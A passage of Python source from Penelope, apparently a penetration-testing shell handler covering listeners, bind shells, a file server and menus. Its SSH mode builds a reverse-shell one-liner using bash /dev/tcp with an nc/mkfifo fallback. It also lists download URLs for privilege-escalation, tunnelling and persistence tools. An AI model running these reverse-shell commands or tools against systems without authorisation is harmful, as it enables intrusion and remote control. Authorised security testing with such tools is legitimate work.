				response = message.translate(self._control_char_table).split(' ')
				if not response[0].startswith('"'):
					return
				if response[3][0] == '3':
					color = 'yellow'
				elif response[3][0] in ('4', '5'):
					color = 'red'
				else:
					color = 'green'

				response = getattr(paint(f"{response[0]} {response[1]} {response[3]}\""), color)

				logger.info(
					f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] "
					f"FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}"
				)

		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
			if not self.httpd.server_bind(self.host, self.port):
				return False
			self.httpd.server_activate()
			self.id = core.new_fileserverID
			core.fileservers[self.id] = self
			if not quiet:
				print(self.links)
			self.httpd.serve_forever()

	def stop(self):
		del core.fileservers[self.id]
		if not self.quiet:
			logger.warning(f"Shutting down Fileserver #{self.id}")
		self.httpd.shutdown()


def WinResize(num, stack):
	if core.attached_session is not None and core.attached_session.type == "PTY":
		core.attached_session.update_pty_size()


def custom_excepthook(*args):
	if len(args) == 1 and hasattr(args[0], 'exc_type'):
		exc_type, exc_value, exc_traceback = args[0].exc_type, args[0].exc_value, args[0].exc_traceback
	elif len(args) == 3:
		exc_type, exc_value, exc_traceback = args
	else:
		return
	print("\n", paint('Oops...').RED, f'{EMOJIS["bug"]}\n', paint().yellow, '─' * 80, sep='')
	sys.__excepthook__(exc_type, exc_value, exc_traceback)
	print('─' * 80, f"\n{paint('Penelope version:').red} {paint(__version__).green}")
	print(f"{paint('Python version:').red} {paint(sys.version).green}")
	print(f"{paint('System:').red} {paint(platform.version()).green}\n")

def get_glob_size(_glob, block_size):
	from glob import glob
	from math import ceil
	def size_on_disk(filepath):
		try:
			return ceil(float(os.lstat(filepath).st_size) / block_size) * block_size
		except:
			return 0
	total_size = 0
	for part in shlex.split(_glob):
		for item in glob(normalize_path(part)):
			if os.path.isfile(item):
				total_size += size_on_disk(item)
			elif os.path.isdir(item):
				for root, dirs, files in os.walk(item):
					for file in files:
						filepath = os.path.join(root, file)
						total_size += size_on_disk(filepath)
	return total_size

def url_to_bytes(URL):

	# URLs with special treatment
	URL = re.sub(
		r"https://www.exploit-db.com/exploits/",
		"https://www.exploit-db.com/download/",
		URL
	)

	req = Request(URL, headers={'User-Agent': options.useragent})

	logger.trace(paint(f"Download URL: {URL}").cyan)
	ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()

	while True:
		try:
			response = urlopen(req, context=ctx, timeout=options.short_timeout)
			break
		except (HTTPError, TimeoutError) as e:
			logger.error(e)
		except URLError as e:
			logger.error(e.reason)
			if (hasattr(ssl, 'SSLCertVerificationError') and type(e.reason) == ssl.SSLCertVerificationError) or\
				(isinstance(e.reason, ssl.SSLError) and "CERTIFICATE_VERIFY_FAILED" in str(e)):
				answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N): ")
				if answer.lower() == 'y': # Trust the cert
					ctx = ssl._create_unverified_context()
					continue
			else:
				answer = ask("Connection error. Try again? (Y/n): ")
				if answer.lower() == 'n': # Trust the cert
					pass
				else:
					continue
		return None, None

	filename = response.headers.get_filename()
	if filename:
		filename = filename.strip('"')
	elif URL.split('/')[-1]:
		filename = URL.split('/')[-1]
	else:
		filename = URL.split('/')[-2]

	size = response.headers.get('Content-Length')
	data = bytearray()
	if size:
		pbar = PBar(int(size), caption=f" {paint('⤷').cyan} ", barlen=40, metric=Size)
	while True:
		try:
			chunk = response.read(options.network_buffer_size)
			if not chunk:
				break
			data.extend(chunk)
			if size:
				pbar.update(len(chunk))
		except Exception as e:
			if size:
				pbar.terminate()
			logger.error(e)
			return None, None

	return filename, data

def check_urls():
	threads = 10
	global URLS
	urls = URLS.values()
	space_num = len(max(urls, key=len))
	all_ok = True

	def _probe(url):
		req = Request(url, method="HEAD", headers={'User-Agent': options.useragent})
		try:
			with urlopen(req, timeout=5) as response:
				return url, response.getcode(), None
		except HTTPError as e:
			return url, e.code, None
		except Exception as e:
			return url, None, e

	with ThreadPoolExecutor(threads) as ex:
		futures = {ex.submit(_probe, url): url for url in urls}
		for fut in as_completed(futures):
			url, status_code, err = fut.result()
			if err is not None:
				status_code = err
				all_ok = False
			elif status_code >= 400:
				all_ok = False
			if __name__ == '__main__':
				color = 'RED' if isinstance(status_code, int) and status_code >= 400 or err else 'GREEN'
				print(f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}")
	return all_ok

def listener_menu():
	if not core.listeners:
		return False

	listener_menu.active = True
	func = lambda: _
	listener_menu.control_r, listener_menu.control_w = os.pipe()

	listener_menu.finishing = threading.Event()

	while True:
		tty.setraw(sys.stdin)
		stdout(
			f"\r\x1b[?25l{paint('➤ ').white} "
			f"{EMOJIS['home']} {paint('Main Menu').green} (m) "
			f"{EMOJIS['skull']} {paint('Payloads').magenta} (p) "
			f"{EMOJIS['refresh']} {paint('Clear').yellow} (Ctrl-L) "
			f"{EMOJIS['cancel']} {paint('Quit').red} (q/Ctrl-C)\r\n".encode()
		)

		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])

		if sys.stdin in r:
			command = sys.stdin.read(1).lower()
			if command == 'm':
				func = menu.show
				break
			elif command == 'p':
				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
				print()
				for listener in core.listeners.values():
					print(listener.payloads(), end='\n\n')
			elif command == '\x0C':
				os.system("clear")
			elif command in ('q', '\x03'):
				func = core.stop
				menu.stop = True
				break
			stdout(b"\x1b[1A")
			continue
		break

	termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
	stdout(b"\x1b[?25h\r")
	func()
	os.close(listener_menu.control_r)
	listener_menu.active = False
	listener_menu.finishing.set()
	return True

def load_rc():
	RC = Path(options.basedir / "peneloperc")
	try:
		with open(RC, "r") as rc:
			exec(rc.read(), globals())
	except FileNotFoundError:
		RC.touch()
	os.chmod(RC, 0o600)

def emojis_installed():
	if myOS == "Darwin":
		return True
	try:
		result = subprocess.run(
			["fc-list", ":charset=1F480"],  # 1F480 = Skull emoji
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			text=True
		)
		return bool(result.stdout)
	except:
		pass

# OPTIONS
class Options:
	log_levels = {"silent":'WARNING', "debug":'DEBUG'}

	def __init__(self):
		real_home = Path.home()
		sudo_user = os.environ.get("SUDO_USER")
		if sudo_user:
			real_home = Path(pwd.getpwnam(sudo_user).pw_dir)

		self.basedir = real_home / f'.{__program__}'
		self.default_listener_port = 4444
		self.default_bindshell_port = 5555
		self.default_fileserver_port = 8000
		self.default_interface = "0.0.0.0"
		self.payloads = False
		self.no_log = False
		self.no_timestamps = False
		self.no_colored_timestamps = False
		self.max_maintain = 10
		self.maintain = 1
		self.single_session = False
		self.no_attach = False
		self.no_upgrade = False
		self.debug = False
		self.dev_mode = False
		self.latency = .01
		self.histlength = 2000
		self.long_timeout = 60
		self.short_timeout = 4
		self.max_open_files = 5
		self.verify_ssl_cert = True
		self.proxy = ''
		self.upload_chunk_size = 51200
		self.download_chunk_size = 1048576
		self.network_buffer_size = 16384
		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
		self.logfile = f"{__program__}.log"
		self.debug_logfile = "debug.log"
		self.cmd_histfile = 'cmd_history'
		self.debug_histfile = 'cmd_debug_history'
		self.useragent = "Wget/1.21.2"
		self.upload_random_suffix = False
		self.attach_lines = 20

	def __getattribute__(self, option):
		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
			return self.basedir / super().__getattribute__(option)
#		if option == "basedir":
#			return Path(super().__getattribute__(option))
		return super().__getattribute__(option)

	def __setattr__(self, option, value):
		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
		level = __class__.log_levels.get(option)

		if level:
			level = level if value else 'INFO'
			logging.getLogger(__program__).setLevel(getattr(logging, level))

		elif option == 'maintain':
			if value > self.max_maintain:
				show(f"Maintain value decreased to the max ({self.max_maintain})")
				value = self.max_maintain
			if value < 1:
				value = 1
			#if value == 1: show("Maintain value should be 2 or above")
			if value > 1 and self.single_session:
				show("Single Session mode disabled because Maintain is enabled")
				self.single_session = False

		elif option == 'single_session':
			if self.maintain > 1 and value:
				show("Single Session mode disabled because Maintain is enabled")
				value = False

		elif option == 'no_bins':
			if value is None:
				value = []
			elif type(value) is str:
				value = re.split('[^a-zA-Z0-9]+', value)

		elif option == 'ports':
			if value is None:
				value = [None]
			elif type(value) is str:
				value = re.split('[^a-zA-Z0-9]+', value)

		elif option == 'proxy':
			if not value:
				os.environ.pop('http_proxy', '')
				os.environ.pop('https_proxy', '')
			else:
				os.environ['http_proxy'] = value
				os.environ['https_proxy'] = value

		elif option == 'basedir':
			value.mkdir(parents=True, exist_ok=True)

		if hasattr(self, option) and getattr(self, option) is not None:
			new_value_type = type(value).__name__
			orig_value_type = type(getattr(self, option)).__name__
			if new_value_type == orig_value_type:
				self.__dict__[option] = value
			else:
				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
		else:
			self.__dict__[option] = value

def main():

	## Command line options
	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
		formatter_class=lambda prog: RawTextHelpFormatter(prog, width=150, max_help_position=40))

	parser.add_argument("-p", "--ports", help=f"Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options\n\
(Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port})")
	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell modes")

	method = parser.add_argument_group("Reverse or Bind shell?")
	method.add_argument("-i", "--interface", help="Local interface/IP to listen. (Default: 0.0.0.0)", metavar='')
	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

	hints = parser.add_argument_group("Hints")
	hints.add_argument("-a", "--payloads", help="Show sample reverse shell payloads for active Listeners", action="store_true")
	hints.add_argument("-l", "--interfaces", help="List available network interfaces", action="store_true")
	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

	log = parser.add_argument_group("Session Logging")
	log.add_argument("-L", "--no-log", help="Disable session log files", action="store_true")
	log.add_argument("-T", "--no-timestamps", help="Disable timestamps in logs", action="store_true")
	log.add_argument("-CT", "--no-colored-timestamps", help="Disable colored timestamps in logs", action="store_true")

	misc = parser.add_argument_group("Misc")
	misc.add_argument("-m", "--maintain", help="Keep N sessions per target", type=int, metavar='')
	misc.add_argument("-M", "--menu", help="Start in the Main Menu.", action="store_true")
	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
	misc.add_argument("-C", "--no-attach", help="Do not auto-attach on new sessions", action="store_true")
	misc.add_argument("-U", "--no-upgrade", help="Disable shell auto-upgrade", action="store_true")
	misc.add_argument("-O", "--oscp-safe", help="Enable OSCP-safe mode", action="store_true")

	misc = parser.add_argument_group("File server")
	misc.add_argument("-s", "--serve", help="Run HTTP file server mode", action="store_true")
	misc.add_argument("-prefix", "--url-prefix", help="URL path prefix", type=str, metavar='')

	debug = parser.add_argument_group("Debug")
	debug.add_argument("-N", "--no-bins", help="Simulate missing binaries on target (comma-separated)", metavar='')
	debug.add_argument("-v", "--version", help="Print version and exit", action="store_true")
	debug.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
	debug.add_argument("-dd", "--dev-mode", help="Enable developer mode", action="store_true")
	debug.add_argument("-cu", "--check-urls", help="Check hardcoded URLs health and exit", action="store_true")

	parser.parse_args(None, options)

	# Modify objects for testing
	if options.dev_mode:
		logger.critical("(!) THIS IS DEVELOPER MODE (!)")
		#stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
		#logger.setLevel('DEBUG')
		#options.max_maintain = 50
		#options.no_bins = 'python,python3,script'

	global keyboard_interrupt
	signal.signal(signal.SIGINT, lambda num, stack: core.stop())

	# Show Version
	if options.version:
		print(__version__)

	# Show Interfaces
	elif options.interfaces:
		print(Interfaces())

	# Check hardcoded URLs
	elif options.check_urls:
		signal.signal(signal.SIGINT, signal.SIG_DFL)
		check_urls()

	# Main Menu
	elif options.menu:
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.show()
		menu.start()

	# File Server
	elif options.serve:
		for port in options.ports:
			server = FileServer(*options.args or '.', port=port, host=options.interface, url_prefix=options.url_prefix)
			if server.filemap:
				server.start()
			else:
				logger.error("No files to serve")

	# Reverse shell via SSH
	elif options.args and options.args[0] == "ssh":
		if len(options.args) > 1:
			for port in options.ports:
				TCPListener(host=options.interface, port=port)
				options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={port or options.default_listener_port};"
					f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
					f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
				)
		try:
			if subprocess.run(options.args).returncode == 0:
				logger.info("SSH command executed!")
				menu.start()
			else:
				core.stop()
				sys.exit(1)
		except Exception as e:
			logger.error(e)

	# Bind shell
	elif options.connect:
		success = False
		for port in options.ports:
			if Connect(options.connect, port or options.default_bindshell_port):
				success = True
		if not success:
			sys.exit(1)
		menu.start()

	# Reverse Listeners
	else:
		for port in options.ports:
			TCPListener(host=options.interface, port=port)
			if not core.listeners:
				sys.exit(1)

		listener_menu()
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.start()

#################### PROGRAM LOGIC ####################

# Check Python version
if not sys.version_info >= (3, 6):
	print("(!) Penelope requires Python version 3.6 or higher (!)")
	sys.exit(1)

# Apply default options
options = Options()

# Loggers
## Add TRACE logging level
TRACE_LEVEL_NUM = 25
logging.addLevelName(TRACE_LEVEL_NUM, "TRACE")
logging.TRACE = TRACE_LEVEL_NUM
def trace(self, message, *args, **kwargs):
    if self.isEnabledFor(TRACE_LEVEL_NUM):
        self._log(TRACE_LEVEL_NUM, message, args, **kwargs)
logging.Logger.trace = trace

## Setup Logging Handlers
stdout_handler = logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())
stdout_handler.terminator = ''

file_handler = logging.FileHandler(options.logfile)
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
file_handler.setLevel('INFO') # ??? TODO
file_handler.terminator = ''

debug_file_handler = logging.FileHandler(options.debug_logfile)
debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
debug_file_handler.terminator = ''

## Initialize Loggers
logger = logging.getLogger(__program__)
logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
logger.addHandler(debug_file_handler)

cmdlogger = logging.getLogger(f"{__program__}_cmd")
cmdlogger.setLevel(logging.INFO)
cmdlogger.addHandler(stdout_handler)

# Set constants
myOS = platform.system()
TTY_NORMAL = termios.tcgetattr(sys.stdin)
DISPLAY = 'DISPLAY' in os.environ
TERMINALS = [
	'gnome-terminal', 'mate-terminal', 'qterminal', 'terminator', 'alacritty', 'kitty', 'tilix',
	'konsole', 'xfce4-terminal', 'lxterminal', 'urxvt', 'st', 'xterm', 'eterm', 'x-terminal-emulator'
]
TERMINAL = next((term for term in TERMINALS if shutil.which(term)), None)
MAX_CMD_PROMPT_LEN = 335
LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
URLS = {
	'linpeas':	"https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
	'winpeas':	"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
	'socat':	"https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
	'ncat':		"https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
	'lse':		"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	'powerup':	"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1",
	'deepce':	"https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
	'privesccheck':	"https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1",
	'les':		"https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
	'ngrok_linux':	"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
	'uac_linux':	"https://github.com/tclahr/uac/releases/download/v3.2.0/uac-3.2.0.tar.gz",
	'linux_procmemdump':	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
	'traitor_386':		"https://github.com/liamg/traitor/releases/latest/download/traitor-386",
	'traitor_amd64':	"https://github.com/liamg/traitor/releases/latest/download/traitor-amd64",
	'traitor_arm64':	"https://github.com/liamg/traitor/releases/latest/download/traitor-arm64",
	'pspy32':	"https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
	'pspy64':	"https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
	'panix':	"https://github.com/Aegrah/PANIX/releases/latest/download/panix.sh",
	'chisel_386':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_386.gz",
	'chisel_amd64':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz",
	'chisel_arm64':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_arm64.gz",
	'chisel_win386':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_386.zip",
	'chisel_winamd64':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip",
	'ligolo_amd64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz",
	'ligolo_arm64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_arm64.tar.gz",
}
EMOJIS = {
	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
	'lost':'💔', 'home':'🏠', 'bug':'🐞', 'skull':'💀', 'refresh':'🔄', 'cancel':'🚫', 'no_sessions':'😟',
}

# Python Agent code
GET_GLOB_SIZE = inspect.getsource(get_glob_size)
MESSENGER = inspect.getsource(Messenger)
STREAM = inspect.getsource(Stream)
AGENT = inspect.getsource(agent)

# Python modifications
original_input = input
input = my_input
sys.excepthook = custom_excepthook
threading.excepthook = custom_excepthook
tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
os.umask(0o007)
signal.signal(signal.SIGWINCH, WinResize)
keyboard_interrupt = signal.getsignal(signal.SIGINT)
try:
	import readline
	readline.parse_and_bind("tab: complete")
	default_readline_delims = readline.get_completer_delims()
except ImportError:
	readline = None
	default_readline_delims = None

## Create basic objects
core = Core()
menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
start = menu.start
Listener = TCPListener

# Check for installed emojis
if not emojis_installed():
	logger.warning("Emojis disabled")
	EMOJIS = defaultdict(str)

# Load peneloperc
load_rc()

if __name__ == "__main__":
	main()
